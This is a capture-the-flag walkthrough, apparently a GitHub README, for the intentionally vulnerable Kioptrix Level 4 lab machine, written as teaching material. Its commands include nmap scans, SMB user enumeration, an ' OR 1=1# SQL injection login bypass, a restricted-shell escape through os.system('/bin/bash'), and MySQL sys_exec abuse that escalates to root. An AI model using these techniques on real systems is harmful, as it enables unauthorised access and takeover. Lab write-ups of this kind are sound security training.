<h1 align="center">Kioptrix Level 4 Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access - A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
</p>

---

## Kioptrix Level 4 Walthrough
## 📋 Overview
This guide documents the complete penetration testing methodology for Kioptrix Level 4, detailing each step from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services.
- Enumerate users and services.
- Exploit vulnerabilities to gain initial access.
- Escalate privileges to obtain root access.
- Capture the flag.

## 1. Reconnaissance.
### **Network Discovery.**
We will first run the command; 
> $ifconfig 
---
- To check what ip is allocated to the attacking machine and also determine the subnet range.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/A.%20IFCONFIG.PNG" alt="Webpage Result" width="600"/> </p>

### **Host Discovery**
> $nmap -sn 192.168.56.1/24
---
- We are trying to do a ping sweep to identify live hosts within the subnet.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/B.%20NMAP.PNG" alt="Webpage Result" width="600"/> </p>


### **Port Scan**
> $nmap -p 0-65000 -A 192.168.56.15
---
- Scans all ports from  0- 65000. **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/C.%20Nmap%20port%20scan..PNG" alt="Webpage Result" width="600"/> </p>

### Findings
From our previous scan we can see that:
- port 22 (ssh), 80 (http), 139 (SMB) and 445 (SMB) are open.

## 2. Enumeration.
We navigate to port 80 http://192.168.56.15:80

We have a login page with an authentication form requiring a username and password.

### **SMB Enumeration**
> $enum4linux 192.168.56.15
---

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/D.%20Enum4linux..PNG" alt="Webpage Result" width="600"/> </p>


- We discover some users

- user:[nobody] rid:[0x1f5]
- user:[robert] rid:[0xbbc]
- user:[root] rid:[0x3e8]
- user:[john] rid:[0xbba]
- user:[loneferret] rid:[0xbb8]

Extract the usernames using "cat" command

- robert
- root
- john
- loneferret

## 3. Initial Access Via SQL Injection.
### **Authentication Bypass**
Target: **http://192.168.56.10**

We perform a credential attempt

Username: john
Password: ' OR 1=1#

#### Result
A successful auth bypass revealing John's password **MyNameIsJohn**


<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/E.%20Webpage..PNG" alt="Webpage Result" width="600"/> </p>

## 4. Gaining Shell Access
Now since we have gotten the password to john's account. We will try to 'ssh' into his machine.  Since we saw port 22 was open from the previous nmap scan **"nmap -p 0-65000 -A 192.168.56.15"**

#### SSH Connection
Command:
> -$ ssh -p 22 john@192.168.56.15 -oHostKeyAlgorithms=+ssh-rsa
---

- You will be prompted type "yes" and hit "enter"
- The password is "MyNameIsJohn" from the previous SQLi Attack

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/F.%20Escal1.PNG" alt="Webpage Result" width="600"/> </p>

#### Restricted Shell Escape
We have now reached the peak of the hacking process. Let's try and see what commands can john run.
Command
>john:~$ ? 
---
- We type "?" to get to see the list of allowed commands.
- We find echo which we can try to get a shell.

>john:~$ echo os.system('/bin/bash')
---
- Notice that **"john:~$** " changes to **"john@Kioptrix4:~$"**

## 5. Privilege Escalation
### Information Gathering.
From here we try to search for the string "password" within the PHP files in john's Computer.
Command
> john@Kioptrix4:~$find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null
---
where :
- **find** command is used traverse a directory hierarchy and locate files based on specified criteria. **find /** initiates the find command and tells it to start its search from the root directory of the filesystem.
- **maxdepth 5**: Limits the depth of the search. It restricts the search to a maximum of five levels deep.
- **name *.php**: This criterion filters the search results by filename. It specifies that only files whose names end with the extension .php should be considered. The * acts as a wildcard.
- **type f**: This further refines the results to ensure that find only processes regular files and ignores other filesystem objects like directories, symbolic links, or special device files.
- **exec grep -Hn password {} \;** - Search for "password" strings


<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/F.%20Escal1.PNG" alt="Webpage Result" width="600"/> </p>

- We see that there's a mysql root with a blank password.

### MySQL Exploitation
We try to access the mysql interface by trying to login

Commannd
>john@Kioptrix4:~$ mysql -u root
---

###Enumeration MySQL functions
Then we try multiple SQL statements to see what more we can find after logging in

Command 
>mysql> select * from mysql.func;
---

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/G.%20MYSQL1..PNG" alt="Webpage Result" width="600"/> </p>

- We find a very important element "sys_exec" which can be used for system command execution.

### Group Escalation Privilege.
We run the command
> mysql> select sys_exec('usermod -a -G admin john');
---
- What this command does is adds (-a) John (usermod) to the admin group (-G)

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/H.%20MYSQL2..PNG" alt="Webpage Result" width="600"/> </p>


- Then quit the mysql interface
command
> mysql> quit
---
- Then you will be back to "john@Kioptrix4:~$"

### Final Privilege Escalation
Command are as follows
> john@Kioptrix4:~$ sudo su
---
- You will be prompted for password which was **"MyNameIsJohn"**
- Shell changes from **"john@Kioptrix4:~$"** to **"root@Kioptrix4:/home/john#"** 

run the command
>root@Kioptrix4:/home/john# whoami
---
- Then move into the folder "root".
command
> root@Kioptrix4:/home/john# cd /root
---

- List the contents of the /root folder
> root@Kioptrix4:~# ls -alps
---

- Access the congrats.txt
> root@Kioptrix4:~# cat congrats.txt
---

<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/I.%20CONGRATS..PNG" alt="Webpage Result" width="600"/> </p>

🔒 Security Recommendations
- Input Validation: Implement proper input sanitization to prevent SQL injection
- Password Policies: Enforce strong password policies
- Service Hardening: Disable unnecessary services and ports
- Privilege Separation: Limit MySQL functions and user privileges
- Regular Updates: Keep all software updated with security patches
- Log Monitoring: Implement comprehensive logging and monitoring


## 🔧 Tools Used

```bash
🛡️ Network & Service Discovery:
- ifconfig · Nmap · enum4linux

🔓 Exploitation Tools:
- Manual SQL Injection · SSH · MySQL

🔍 Information Gathering:
- find · grep · cat · ls

💻 System Tools:
- bash · sudo · usermod · mysql




<p align="center"> <strong>Documentation created for educational purposes</strong><br> All techniques should be practiced only in controlled, authorized environments. </p>

